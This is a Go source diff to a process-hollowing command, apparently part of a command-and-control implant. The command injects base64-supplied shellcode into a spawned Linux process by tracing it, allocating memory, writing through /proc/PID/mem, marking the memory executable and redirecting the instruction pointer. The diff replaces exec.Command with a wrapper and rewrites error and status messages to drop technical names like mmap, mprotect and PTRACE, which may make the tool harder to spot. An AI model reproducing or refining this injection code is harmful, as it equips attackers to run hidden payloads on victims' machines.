@@ -5,7 +5,6 @@ package commands
 import (
 	"encoding/base64"
 	"fmt"
-	"os/exec"
 	"runtime"
 	"strings"
 	"syscall"
@@ -35,16 +34,16 @@ func (c *HollowingCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if params.ShellcodeB64 == "" {
-		return errorResult("Error: shellcode_b64 is required")
+		return errorResult("shellcode_b64 is required")
 	}
 
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
 	if err != nil {
-		return errorf("Error decoding shellcode: %v", err)
+		return errorf("decoding shellcode: %v", err)
 	}
 
 	if len(shellcode) == 0 {
-		return errorResult("Error: shellcode is empty")
+		return errorResult("shellcode is empty")
 	}
 
 	if params.Target == "" {
@@ -77,13 +76,13 @@ func performHollowingLinux(shellcode []byte, params hollowParams) (string, error
 		args = []string{"86400"}
 	}
 
-	cmd := exec.Command(parts[0], args...)
+	cmd := safeCmd(parts[0], args...)
 	cmd.SysProcAttr = &syscall.SysProcAttr{
 		Ptrace: true,
 	}
 
 	if err := cmd.Start(); err != nil {
-		return sb.String(), fmt.Errorf("CreateProcess failed: %w", err)
+		return sb.String(), fmt.Errorf("process creation failed: %w", err)
 	}
 
 	pid := cmd.Process.Pid
@@ -105,7 +104,7 @@ func performHollowingLinux(shellcode []byte, params hollowParams) (string, error
 	var origRegs syscall.PtraceRegs
 	if err := syscall.PtraceGetRegs(pid, &origRegs); err != nil {
 		_ = cmd.Process.Kill()
-		return sb.String(), fmt.Errorf("PTRACE_GETREGS: %w", err)
+		return sb.String(), fmt.Errorf("register read: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Original RIP: 0x%X\n", origRegs.Rip))
 
@@ -128,13 +127,13 @@ func performHollowingLinux(shellcode []byte, params hollowParams) (string, error
 		9, 0, pageSize, 3, 0x22, 0xffffffffffffffff, 0)
 	if err != nil {
 		_ = cmd.Process.Kill()
-		return sb.String(), fmt.Errorf("mmap failed: %w", err)
+		return sb.String(), fmt.Errorf("memory allocation failed: %w", err)
 	}
 	if allocAddr >= 0xfffffffffffff000 {
 		_ = cmd.Process.Kill()
-		return sb.String(), fmt.Errorf("mmap returned MAP_FAILED (0x%X)", allocAddr)
+		return sb.String(), fmt.Errorf("memory allocation returned error (0x%X)", allocAddr)
 	}
-	sb.WriteString(fmt.Sprintf("[+] mmap RW at 0x%X (%d bytes)\n", allocAddr, pageSize))
+	sb.WriteString(fmt.Sprintf("[+] Allocated writable memory at 0x%X (%d bytes)\n", allocAddr, pageSize))
 
 	// Step 5: Write shellcode via /proc/PID/mem
 	memPath := fmt.Sprintf("/proc/%d/mem", pid)
@@ -150,12 +149,12 @@ func performHollowingLinux(shellcode []byte, params hollowParams) (string, error
 		10, allocAddr, pageSize, 5, 0, 0, 0)
 	if err != nil {
 		_ = cmd.Process.Kill()
-		return sb.String(), fmt.Errorf("mprotect failed: %w", err)
+		return sb.String(), fmt.Errorf("protection change failed: %w", err)
 	}
 	if mprotectRet != 0 {
-		sb.WriteString(fmt.Sprintf("[!] mprotect returned %d, continuing\n", int64(mprotectRet)))
+		sb.WriteString(fmt.Sprintf("[!] Protection change returned %d, continuing\n", int64(mprotectRet)))
 	} else {
-		sb.WriteString("[+] mprotect: RW → RX\n")
+		sb.WriteString("[+] Protection changed to read+execute\n")
 	}
 
 	// Step 7: Redirect execution to shellcode
@@ -164,13 +163,13 @@ func performHollowingLinux(shellcode []byte, params hollowParams) (string, error
 	newRegs.Orig_rax = ^uint64(0)
 	if err := syscall.PtraceSetRegs(pid, &newRegs); err != nil {
 		_ = cmd.Process.Kill()
-		return sb.String(), fmt.Errorf("PTRACE_SETREGS: %w", err)
+		return sb.String(), fmt.Errorf("register write: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Set RIP to 0x%X\n", allocAddr))
 
 	// Step 8: Resume — detach and let shellcode run
 	if err := syscall.PtraceDetach(pid); err != nil {
-		sb.WriteString(fmt.Sprintf("[!] PTRACE_DETACH failed: %v\n", err))
+		sb.WriteString(fmt.Sprintf("[!] Detach failed: %v\n", err))
 	} else {
 		sb.WriteString("[+] Detached from process\n")
 	}
